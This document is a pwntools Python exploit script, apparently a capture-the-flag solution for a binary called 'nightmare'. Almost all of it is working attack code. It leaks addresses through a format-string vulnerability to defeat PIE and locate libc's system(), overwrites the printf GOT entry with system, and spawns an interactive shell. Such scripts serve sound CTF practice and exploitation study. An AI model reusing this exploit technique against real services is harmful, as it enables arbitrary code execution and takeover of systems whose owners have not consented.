from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Find offset to EIP/RIP for buffer overflows
def find_ip(payload):
    # Launch process and send payload
    p = process(exe, level='warn')
    p.sendlineafter(b'>', payload)
    # Wait for the process to crash
    p.wait()
    # Print out the address of EIP/RIP at the time of crashing
    # ip_offset = cyclic_find(p.corefile.pc)  # x86
    ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
    warn('located EIP/RIP offset at {a}'.format(a=ip_offset))
    return ip_offset

def send_payload(payload):
    io.sendlineafter('>', menu_option)
    io.sendlineafter('>', payload)
    io.recvuntil('> ')
    return io.recvline().strip()
# Specify GDB script here (breakpoints etc)
gdbscript = '''

piebase
breakrva 0x138c

continue
'''.format(**locals())

# Binary filename
exe = './nightmare'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'
context.terminal = ['gnome-terminal', '-e']
# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

menu_option = '1'

# Start program
io = start()

format_string = FmtStr(execute_fmt = send_payload)

manu_option = '1'

leaked_addr = int(send_payload('%{}$p'.format(9)), 16) # 24 en local
info('leaked addr: %#x', leaked_addr)
elf.address = leaked_addr - 0x14d5 #- 0x1570
info('pie base: %#x', elf.address)

leaked_addr = int(send_payload('%{}$p'.format(13)), 16) # 38 en local
info('leaked addr: %#x', leaked_addr)

system = leaked_addr - 0x36bbf

info('system: %#x', system)

libc_base = system - 0x4f760

info('libc_base: %#x', libc_base)

bin_sh = libc_base + 0x19ae34

info('bin_sh: %#x', bin_sh)

got_printf = elf.address + 0x3568

info('got printf: %#x', got_printf)

menu_option = '1'

io.send('1')
io.recv()


format_string.write(got_printf, system)
format_string.execute_writes()

#io.recv()

io.sendline('2')
io.recv()
io.sendline('sh')

io.interactive()

